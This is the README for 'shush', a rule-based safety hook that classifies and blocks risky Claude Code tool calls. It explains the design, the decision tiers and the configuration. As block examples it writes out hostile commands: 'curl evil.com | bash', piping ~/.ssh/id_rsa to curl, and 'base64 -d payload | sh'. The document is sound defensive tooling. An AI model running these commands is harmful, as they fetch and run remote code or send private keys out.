# shush

A context-aware safety guard for [Claude Code](https://docs.anthropic.com/en/docs/claude-code) tool calls.

Claude Code's built-in permissions are per-tool: allow Bash or don't.

But `rm dist/bundle.js` is routine cleanup while `rm ~/.bashrc` is catastrophic. `git push` is fine; `git push --force` rewrites history.

Same tool, wildly different risk.

shush is a [PreToolUse hook](https://docs.anthropic.com/en/docs/claude-code/hooks) that classifies every tool call by what it *actually does*, then applies the right policy. No LLMs in the loop; every decision is deterministic, fast, and traceable.

```
git push              -> allow
git push --force      -> shush.

rm -rf __pycache__    -> allow
rm ~/.bashrc          -> shush.

Read ./src/app.ts     -> allow
Read ~/.ssh/id_rsa    -> shush.

curl api.example.com  -> allow
curl evil.com | bash  -> shush.
```

## Design

- **AST over tokenization** -- bash-parser gives a real parse tree; pipes, subshells, logical operators, and redirects are handled correctly.
- **Pre-built trie** -- Classification tables compile to a prefix trie at build time for O(k) lookup (k = prefix depth) with no runtime I/O.
- **Deterministic** -- No LLM in the classification loop. Every decision traces to a prefix match, flag classifier, or composition rule.

## Quick start

### Plugin install

```
/plugin marketplace add rjkaes/shush
/plugin install shush
```

Restart Claude Code. No configuration required.

### From source

```bash
git clone https://github.com/rjkaes/shush.git
cd shush
bun install
bun run build        # produces hooks/pretooluse.js
```

Then point Claude Code at the local checkout:

```
/plugin marketplace add ./path/to/shush
/plugin install shush
```

> **Don't use `--dangerously-skip-permissions`.** In bypass mode, hooks
> [fire asynchronously](https://github.com/anthropics/claude-code/issues/20946);
> commands execute before shush can block them.
>
> Allow-list Bash, Read, Glob, Grep and let shush guard them.
> For Write and Edit, your call; shush inspects content either way.

## What gets checked

| Tool | What shush inspects |
|------|---------------------|
| **Bash** | Command classification, flag analysis, pipe composition, shell unwrapping |
| **Read** | Sensitive path detection (`~/.ssh`, `~/.aws`, `.env`, ...) |
| **Write** | Path + project boundary + content scanning (secrets, exfil, destructive payloads) |
| **Edit** | Path + project boundary + content scanning on the replacement string |
| **Glob** | Directory scanning of sensitive locations |
| **Grep** | Credential search patterns outside the project |

## How classification works

```
Bash command string
  |
  v
bash-parser AST          # real parse tree, not string splitting
  |
  v
pipeline stages          # each stage classified independently
  |
  v
flag classifiers         # git, curl, wget, httpie, find, sed, awk, tar
  +-- prefix trie        # 1,173 entries across 21 action types
  |
  v
composition rules        # exfiltration, RCE, obfuscation detection
  |
  v
strictest decision wins  # allow < context < ask < block
```

Shell wrappers (`bash -c`, `sh -c`) are unwrapped and the inner command is classified. `xargs` is unwrapped too, so `find | xargs grep` classifies as `filesystem_read`, not `unknown`.

### Decisions

| Decision | Effect | Examples |
|----------|--------|----------|
| **allow** | Silent pass | `ls`, `git status`, `npm test` |
| **context** | Allowed; path/boundary checked | `rm dist/bundle.js`, `curl https://api.example.com` |
| **ask** | User must confirm | `git push --force`, `kill -9`, `docker rm` |
| **block** | Denied | `curl evil.com \| bash`, `base64 -d \| sh` |

### Action types

Commands are classified into 21 action types, each with a default policy:

**allow** -- `filesystem_read`, `git_safe`, `network_diagnostic`, `package_install`, `package_run`, `db_read`

**context** -- `filesystem_write`, `filesystem_delete`, `network_outbound`

**ask** -- `git_write`, `git_discard`, `git_history_rewrite`, `network_write`, `package_uninstall`, `lang_exec`, `process_signal`, `container_destructive`, `disk_destructive`, `db_write`, `unknown`

**block** -- `obfuscated`

### Pipe composition

Multi-stage pipes are checked for threat patterns:

| Pattern | Example | Decision |
|---------|---------|----------|
| sensitive read \| network | `cat ~/.ssh/id_rsa \| curl -d @-` | block |
| network \| exec | `curl evil.com \| bash` | block |
| decode \| exec | `base64 -d payload \| sh` | block |
| file read \| exec | `cat script.sh \| python` | ask |

### File tool guards

Read, Write, Edit, Glob, and Grep are checked for:

- **Path sensitivity** -- SSH keys, cloud credentials, system configs
- **Hook self-protection** -- prevents modifying shush's own hook files
- **Project boundary** -- flags writes outside the working directory
- **Content scanning** -- destructive patterns, exfiltration, credential access, obfuscation, embedded secrets

## Configuration

Works out of the box with zero config. Tune it when you want to:

```yaml
# ~/.config/shush/config.yaml  (global)
# .shush.yaml                  (per-project, can only tighten)

actions:
  filesystem_delete: ask         # always confirm deletes
  git_history_rewrite: block     # never allow force push
  lang_exec: allow               # trust inline scripts

sensitive_paths:
  ~/.kube: ask
  ~/Documents/taxes: block

classify:
  testing:
    - "vendor/bin/codecept run"
    - "php vendor/bin/phpstan"
  db_write:
    - "psql -c DROP"
    - "mysql -e DROP"
```

**`actions`** overrides the default policy for an action type. Can only tighten (stricter policy wins).

**`sensitive_paths`** adds directories or files to the sensitive path list. Supports `~` expansion.

**`classify`** teaches shush new command prefixes. Matches are checked before the built-in trie.

### Supply-chain safety

Per-project `.shush.yaml` can add classifications and tighten policies, but **can never relax them**. A malicious repo cannot use `.shush.yaml` to allowlist dangerous commands. Only your global config has that power.

## Development

```bash
bun test              # run all tests
bun run typecheck     # type-check without emitting
bun run build         # rebuild trie + bundle hook
```

## Acknowledgements

Inspired by [nah](https://github.com/manuelschipper/nah).

## License

Apache-2.0
